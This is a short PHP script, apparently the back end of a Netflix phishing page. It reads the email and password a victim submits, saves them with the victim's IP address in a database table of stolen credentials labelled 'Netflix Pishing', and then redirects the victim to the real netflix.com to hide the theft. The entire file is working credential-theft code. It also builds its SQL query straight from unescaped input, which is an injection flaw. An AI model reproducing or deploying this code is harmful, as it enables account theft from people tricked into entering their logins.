<?php
$email = $_POST["email"];
$pass = $_POST["password"];

include($_SERVER['DOCUMENT_ROOT'].'/proxy/connect.php');
$sql = "INSERT INTO credenciales (ip, origen, usuario, contrasena) VALUES ('$ipaddress','Netflix Pishing', '$email', '$pass')";
if ($conn->query($sql) === TRUE) {
    $error = "Creado adecuadamente.";
} else {
    $error = "Hubo un error en la peticion.";
}
header("Location: " . PROXY_PREFIX_ALL . "?https://netflix.com");
exit();
?>
